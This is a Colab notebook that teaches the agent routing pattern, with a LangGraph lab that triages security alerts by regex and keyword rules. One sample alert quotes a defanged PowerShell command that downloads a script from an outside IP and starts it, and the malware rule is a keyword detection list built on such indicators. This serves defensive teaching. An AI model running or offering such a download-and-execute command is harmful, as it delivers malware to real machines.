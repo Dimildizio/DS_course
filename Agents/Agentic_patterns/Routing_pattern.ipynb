{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNDtfGvbIbDVqM3UYRc2qm6",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Dimildizio/DS_course/blob/main/Agents/Agentic_patterns/Routing_pattern.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Routing Pattern\n",
        "\n",
        "**Core AI pattern:** chooses the right path (prompt, tool, model, or chain) for each input.\n",
        "\n",
        "Boosts accuracy, lowers cost/latency, and keeps outputs consistent by **sending different problems to different specialists**.\n",
        "\n",
        "Essential for agents that must decide what to do next before doing it.\n",
        "\n",
        "Building block for tool-use, multi-expert systems, and safe fallbacks."
      ],
      "metadata": {
        "id": "HYRjFKph4V99"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Theory"
      ],
      "metadata": {
        "id": "P_FxUTv_4jGq"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### What is it?\n",
        "\n",
        "A **router** inspects an input and **dispatches** it **to** the best **handler**:\n",
        "\n",
        "- Different prompts (e.g., “SQL Expert” vs “Email Writer”)\n",
        "\n",
        "- Different tools (calculator, web search, vector DB)\n",
        "\n",
        "- Different models (small/cheap vs large/accurate)\n",
        "\n",
        "- Different sub-chains (RAG flow vs generation-only, etc)\n",
        "\n",
        "The router can be **rule-based, ML/embedding-based, LLM-as-classifier, or hybrid.**"
      ],
      "metadata": {
        "id": "FfmWFEO748NM"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Why It Matters?\n",
        "\n",
        "**One-size-fits-all prompts** waste tokens and **underperform** because:\n",
        "\n",
        "- Tasks have heterogeneous structure and constraints.\n",
        "\n",
        "- Some cases need tools, others don't.\n",
        "\n",
        "- Many inputs are easy (use small model), some are hard (escalate).\n",
        "\n",
        "- Safety/compliance may require blocking or escalation.\n",
        "\n",
        "\n",
        "#### Routing improves:\n",
        "\n",
        "- Accuracy: expert prompts beat generic ones.\n",
        "\n",
        "- Cost/Latency: cheap paths for easy cases; heavy paths only when needed.\n",
        "\n",
        "- Safety: detect disallowed/PII-sensitive inputs and abstain or handoff."
      ],
      "metadata": {
        "id": "jya-a87A5QIb"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Key Components\n",
        "\n",
        "**Classifier / Gating**\n",
        "\n",
        "- Rules: regex/keywords, heuristics, schema checks.\n",
        "- Embeddings/ML: nearest-neighbor to labeled routes, lightweight classifiers.\n",
        "- LLM-as-Router: single JSON decision (route, confidence, rationale).\n",
        "- Hybrid: rules first (fast/safe), then LLM when uncertain.\n",
        "\n",
        "**Targets (Experts)**\n",
        "\n",
        "- Prompts, tools, models, or full chains with clear contracts (input/output schema).\n",
        "\n",
        "**Unification Layer**\n",
        "\n",
        "- Normalize outputs across branches (e.g., a common JSON envelope) so downstream code stays simple.\n",
        "\n",
        "**Confidence & Fallbacks**\n",
        "\n",
        "- Thresholds, tie-breakers, \"unknown/abstain,\" human-in-the-loop, or a generalist path.\n",
        "\n",
        "**Observability**\n",
        "\n",
        "- Route logs, confusion matrix, coverage/precision, cost & latency per route.\n",
        "\n",
        "**Policy & Safety**\n",
        "\n",
        "- Guardrails pre- and post-route (blocklists, PII detection, content policies)."
      ],
      "metadata": {
        "id": "ofuiD9845yI3"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Practical Use Cases\n",
        "\n",
        "- Customer support triage: billing vs tech vs account -> distinct prompts/RAG corpora.\n",
        "- Code assistant: detect language (Py/JS/SQL) -> language-specific prompts & unit-testers.\n",
        "- Doc extraction: detect doc type (invoice, receipt, ID) -> specialized parsers/schemata as tool.\n",
        "- RAG index selection: pick the right knowledge base or retriever per query.\n",
        "- Tool choice (I'd say most obvious): math -> calculator; current events -> web; entity lookup -> DB.\n",
        "- Multilingual: route by language to locale-tuned prompts/models.\n",
        "- Security: alert/IOC triage -> malware vs phishing vs misconfig paths; escalate unknowns."
      ],
      "metadata": {
        "id": "cYZupEgJ6VWT"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Tricks, pieces of advice and things to consider\n",
        "\n",
        "**Design choice**: Rules vs ML/embeddings vs LLM-as-router\n",
        "\n",
        "- Rules (regex/heuristics): Fast, cheap, transparent.\n",
        "- ML / Embeddings classifier: Train a lightweight model (or use nearest-neighbor on embeddings) to map inputs -> routes.\n",
        "- LLM-as-router: Ask an LLM to return `{route: \"...\", confidence: 0–1, rationale: \"...\"}`, however in practice LLM would likely return 0.3 for not sure, 0.9 for high confidence so it really feels binary\n",
        "- Hybrid (in practice wins in most cases): Rules first (block obvious, fast wins) -> embeddings/ML if uncertain -> LLM only when confidence is low or case is novel.\n",
        "\n",
        "**Contract**: Keep branch outputs schema-aligned.\n",
        "\n",
        "- What: Every branch should return the same envelope so downstream code doesn’t care which path ran.\n",
        "- Why: Simplifies integration, logging, and evaluation.\n",
        "- How: Validate with Pydantic (or Marshmallow) and reject/repair non-conforming outputs.\n",
        "\n",
        "\n",
        "**Safety**: Always include block/abstain and human handoff. The router must be able to say \"don't answer\" and escalate.\n",
        "\n",
        "- Blocklist / policy gates (pre-route): `disallowed content -> {route:\"blocked\", reason:\"pii_detected\"}`.\n",
        "- Abstain on low-confidence: If `confidence < threshold -> {route:\"abstain\"}` and trigger fallback (generalist model) or human triage.\n",
        "- Post-route checks: Scan generated outputs (hallucination detector, SQL safety linter). If fails -> auto-revise or escalate.\n",
        "- Metadata to keep: `reason`, `policy_category`, `recommended_action: \"escalate|revise|drop\"`.\n",
        "-Obviously do not forget to escalate and return.\n",
        "For example:\n",
        "```\n",
        "{ \"route\":\"abstain\", \"confidence\":0.42, \"reason\":\"ambiguous intent\", \"handoff\":\"human_security_analyst\" }\n",
        "```\n",
        "\n",
        "**Ops**: Track route quality and adjust thresholds, cache easy decisions.\n",
        "\n",
        "Treat routing like a model-measure and tune it.\n",
        "\n",
        "- Metrics to log\n",
        "\n",
        "  - Coverage per route (% of traffic).\n",
        "  - Accuracy/Success per route (task-specific score).\n",
        "  - Confusion matrix (where the router picked A but ground truth was B).\n",
        "  - Latency & cost per route.\n",
        "  - Abstain rate and escalation outcomes.\n",
        "\n",
        "- Threshold tuning\n",
        "\n",
        "  - Pick confidence threshold per route to maximize a cost-aware objective. (Might be tricky to choose how).\n",
        "\n",
        "- Caching\n",
        "\n",
        "  - ALWAYS take into account KV-cache since depending on context window it could eat way more vRAM than the model itself. Use KV budgets, eviction tiers, and route-aware policies to keep VRAM stable. Alternatives to KV-cache - prefix KV cache (bounded), response cache (exact matches), retrieval/embedding cache (to reduce prompt length next time).\n",
        "  - Cache final answers and shared prefixes, not full user contexts.\n",
        "  - Normalize input -> compute a routing key (for example hash of lemmatized text).\n",
        "  - If seen before with high confidence, reuse route (and even final answer if safe).\n",
        "  - Great for FAQs and repeated queries -> slashes latency/cost.\n",
        "\n"
      ],
      "metadata": {
        "id": "28nHEt2-7LDV"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## TL;DR\n",
        "\n",
        "**What**: A decision layer that routes inputs to the best expert path.\n",
        "\n",
        "**Why**: Higher accuracy with lower cost/latency and better safety.\n",
        "\n",
        "**Rule of Thumb**: Use routing when tasks are heterogeneous, tools/models differ by case, or you need abstain/escalation behavior."
      ],
      "metadata": {
        "id": "ijLt7ury6xO6"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Practice"
      ],
      "metadata": {
        "id": "upixbTSBQUwx"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Set up"
      ],
      "metadata": {
        "id": "GgV_CPHDRNJ7"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "pip install -q langgraph"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "K7m25q415HRr",
        "outputId": "18becd3f-8739-46fd-938c-87218ca16d85"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[?25l     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/43.7 kB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m43.7/43.7 kB\u001b[0m \u001b[31m1.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m153.3/153.3 kB\u001b[0m \u001b[31m3.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m43.9/43.9 kB\u001b[0m \u001b[31m3.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m54.6/54.6 kB\u001b[0m \u001b[31m3.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m216.7/216.7 kB\u001b[0m \u001b[31m18.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "import json\n",
        "import re\n",
        "import requests\n",
        "import time\n",
        "import math\n",
        "import hashlib\n",
        "import string\n",
        "import requests\n",
        "import numpy as np\n",
        "\n",
        "from typing import TypedDict, Optional\n",
        "\n",
        "from google.colab import userdata\n",
        "from langgraph.graph import StateGraph, END\n",
        "from pydantic import BaseModel, Field\n",
        "from sentence_transformers import SentenceTransformer\n",
        "from sklearn.metrics.pairwise import cosine_similarity\n",
        "\n",
        "\n",
        "OPENROUTER_API_KEY = userdata.get('openrouter')\n",
        "\n",
        "BASE_URL = \"https://openrouter.ai/api/v1/chat/completions\"\n",
        "HEADERS = {\"Authorization\": f\"Bearer {OPENROUTER_API_KEY}\"}\n",
        "\n",
        "MODEL_ROUTER = \"qwen/qwen3-30b-a3b:free\"\n",
        "MODEL_EXPERT = \"mistralai/mistral-small-3.2-24b-instruct:free\"\n"
      ],
      "metadata": {
        "id": "71Ya-52cQXov"
      },
      "execution_count": 5,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Dataset example"
      ],
      "metadata": {
        "id": "vN9ww89WRWsw"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "TEST_ALERTS = [\n",
        "  (\"phishing\", \"\"\"User reports email urging immediate password reset. Link goes to login-acme-security[.]com, DKIM fails. Message requests MFA backup codes.\"\"\"),\n",
        "  (\"malware\", \"\"\"EDR flagged PowerShell: iwr hxxp://185.203.116.44/upd.ps1 -o C:\\\\Users\\\\Public\\\\upd.ps1; start-process. File hash 9f2c...e12. Beacon-like 60s jitter.\"\"\"),\n",
        "  (\"misconfig\", \"\"\"CloudTrail shows s3://acme-data set to public-read. No IOCs; finding is CIS-3.1 noncompliance.\"\"\"),\n",
        "  (\"blocked\", \"\"\"Email contains full card: 4111-1111-1111-1111 exp 12/27. Requesting storage in helpdesk ticket.\"\"\"),\n",
        "  (\"unknown\", \"\"\"Potential lateral movement from srv-db-03 to srv-erp-02. Insufficient details to classify.\"\"\")]\n"
      ],
      "metadata": {
        "id": "ALoDoRXORbK6"
      },
      "execution_count": 6,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Call func"
      ],
      "metadata": {
        "id": "yI_4pgKtRRYB"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def call(model, messages, **kw):\n",
        "    payload = {\"model\": model, \"messages\": messages, **kw}\n",
        "    r = requests.post(BASE_URL, headers=HEADERS, json=payload, timeout=20)\n",
        "    r.raise_for_status()\n",
        "    return r.json()[\"choices\"][0][\"message\"][\"content\"]"
      ],
      "metadata": {
        "id": "OdcvBOgSRDVo"
      },
      "execution_count": 7,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Unified Envelope"
      ],
      "metadata": {
        "id": "JDkqbF5qvEBz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Envelope(BaseModel):\n",
        "    route: str\n",
        "    answer: str\n",
        "    data: dict = Field(default_factory=dict)\n",
        "    citations: list[str] = Field(default_factory=list)\n",
        "    confidence: float = 0.0\n",
        "    extras: dict = Field(default_factory=dict)\n",
        "    error: str | None = None\n",
        "    schema_version: str = \"1.0\"\n"
      ],
      "metadata": {
        "id": "Nej9-98f4j5C"
      },
      "execution_count": 9,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### LAB 1: Heuristic Rules Router as a Graph Node\n",
        "\n",
        "First layer of Routing\n",
        "\n",
        "**Skill**: Rules/regex gating + building LangGraph node and edge.\n",
        "\n",
        "**Goal**: Classify alerts with simple heuristics and return (route, confidence, reason).\n",
        "\n",
        "#### **Task**\n",
        "\n",
        "- Implement rules_router(alert_text).\n",
        "- Build a minimal LangGraph with a single node rules_node and a terminal.\n",
        "- Run the graph on TEST_ALERTS and note misroutes/abstains.\n",
        "\n",
        "\n",
        "#### **Explanation**\n",
        "\n",
        "- We put a pre-route safety gate into rules to block PII right away (fast & safe).\n",
        "- Routing is like airport security: simple metal detectors first, then more advanced scans if needed.\n",
        "- We return a structured decision to keep later steps consistent.\n",
        "- A single-node graph is trivial, but forces you into explicit control flow, which will pay off as we add branches.\n",
        "\n",
        "\n",
        "#### **Whats and Why's**\n",
        "\n",
        "- Define possible routes -> phishing, malware, misconfig, abstain (not sure), blocked (policy violation).\n",
        "\n",
        "- Write basic rules (regex + keywords) -> if we see signs of credit card numbers -> block, if we see \"reset password\" -> phishing; if \"powershell\" → malware; if \"public-read\" -> misconfig.\n",
        "\n",
        "- Build a routing node in a LangGraph -> this wraps the rules into a reusable step in a graph of decisions.\n",
        "\n",
        "Heuristics would be a first Layer in **Hybrid Router**\n",
        "- Rules catch the obvious 60-70% of cases, and we only escalate the tricky ones."
      ],
      "metadata": {
        "id": "j0IkAKw343Iq"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Define RouteState\n",
        "\n",
        "A StateGraph is a directed graph where each node is a function that takes some state (a Python dict/TypedDict) and returns updated state. Basically carry the alert and the routing decision.\n",
        "\n",
        "Here, RouteState defines what fields we track (text, decision).\n",
        "\n"
      ],
      "metadata": {
        "id": "M_1Uy97K79hb"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class RouteState(TypedDict):\n",
        "    text: str\n",
        "    decision: Optional[dict]"
      ],
      "metadata": {
        "id": "buXbr-wl7vNp"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Define rules"
      ],
      "metadata": {
        "id": "whXbG3HJ8EIl"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "ROUTES = [\"phishing\",\"malware\",\"misconfig\",\"abstain\",\"blocked\"]\n",
        "\n",
        "\n",
        "def rules_node(state: RouteState):\n",
        "    return {\"decision\": rules_router(state[\"text\"])}\n",
        "\n",
        "\n",
        "def rules_router(text: str): # very basic router rules\n",
        "    t = text.lower()\n",
        "    # Pre-route blocklist (crude CC number)\n",
        "    if re.search(r\"\\b(?:\\d[ -]*?){13,16}\\b\", t):\n",
        "        return {\"route\":\"blocked\",\"confidence\":0.99,\"reason\":\"pii_detected:card\"}\n",
        "    # Phishing\n",
        "    if any(k in t for k in [\"dkim fails\",\"reset password\",\"mfa backup codes\"]) or \"login-\" in t:\n",
        "        return {\"route\":\"phishing\",\"confidence\":0.8,\"reason\":\"email_auth_signals\"}\n",
        "    # Malware\n",
        "    if any(k in t for k in [\"powershell\",\"beacon\",\"hxxp://\",\"upd.ps1\",\"hash \"]):\n",
        "        return {\"route\":\"malware\",\"confidence\":0.8,\"reason\":\"edr_iocs\"}\n",
        "    # Misconfig\n",
        "    if any(k in t for k in [\"public-read\",\"cis-\",\"0.0.0.0/0\",\"open bucket\",\"exposed s3\"]):\n",
        "        return {\"route\":\"misconfig\",\"confidence\":0.75,\"reason\":\"cloud_misconfig\"}\n",
        "    return {\"route\":\"abstain\",\"confidence\":0.4,\"reason\":\"insufficient_rules\"}\n"
      ],
      "metadata": {
        "id": "RqFzZbXk43dL"
      },
      "execution_count": 12,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Flow"
      ],
      "metadata": {
        "id": "bMxzdIgeLmuP"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "```scss\n",
        "   (Entry)\n",
        "     │\n",
        "     ▼\n",
        " [ rules_node ]  --decision-->  END\n",
        "\n",
        "```"
      ],
      "metadata": {
        "id": "Ih2JNBHVLjiB"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### LangGraph recap\n",
        "\n",
        "**Node**\n",
        "\n",
        "A `node` is a function wrapped into the graph.\n",
        "\n",
        "In `rules_node` defined above when the graph hits the `rules` node, it executes `rules_node` and *updates the state* with a new decision.\n",
        "\n",
        "**Entry point**\n",
        "\n",
        "Is where the graph starts when we run it.\n",
        "\n",
        "Every run starts by going through the `rules` node (that execute `rules_node`).\n",
        "\n",
        "**Edges**\n",
        "\n",
        "Edge connects two nodes: after rules, go to `END`.\n",
        "\n",
        "`END` is a special built-in that tells to stop and return the final state.\n",
        "\n",
        "So in this first graph below here, it's a straight pipeline: `start → rules → END.`\n",
        "\n",
        "**Invoking**\n",
        "\n",
        "`g.compile()` below turns the graph definition into an executable object (*app1*).\n",
        "\n",
        "`.invoke(state)` runs the graph with an initial state.\n",
        "\n",
        "The graph will:\n",
        "\n",
        "1. Start at the entry point (rules)\n",
        "2. Run the node function (rules_node)\n",
        "3. Follow the edges/conditionals (in further labs) until it reaches END\n",
        "4. Return the final state dictionary\n",
        "\n",
        "\n",
        "Eventhough we use `.invoke` in several other libraries to call ML/LLM models, here `.invoke` is not necessary a call to LLM, it **just runs the workflow.**\n",
        "\n",
        "*WHAT* it calls *depends on what's inside the nodes*."
      ],
      "metadata": {
        "id": "PgrBDDOwH6z3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "g = StateGraph(RouteState)\n",
        "g.add_node(\"rules\", rules_node)\n",
        "g.set_entry_point(\"rules\")\n",
        "g.add_edge(\"rules\", END)\n",
        "app1 = g.compile()"
      ],
      "metadata": {
        "id": "X6F8vjau7otO"
      },
      "execution_count": 13,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Don't forget - no llm included yet, only heuristics\n",
        "for label, text in TEST_ALERTS:\n",
        "    out = app1.invoke({\"text\": text, \"decision\": None})\n",
        "    print(label, \"->\", out[\"decision\"])"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "t3x0Btk-8OFt",
        "outputId": "ca551a83-0070-4842-a32a-7bada583dacb"
      },
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "phishing -> {'route': 'phishing', 'confidence': 0.8, 'reason': 'email_auth_signals'}\n",
            "malware -> {'route': 'malware', 'confidence': 0.8, 'reason': 'edr_iocs'}\n",
            "misconfig -> {'route': 'misconfig', 'confidence': 0.75, 'reason': 'cloud_misconfig'}\n",
            "blocked -> {'route': 'blocked', 'confidence': 0.99, 'reason': 'pii_detected:card'}\n",
            "unknown -> {'route': 'abstain', 'confidence': 0.4, 'reason': 'insufficient_rules'}\n"
          ]
        }
      ]
    }
  ]
}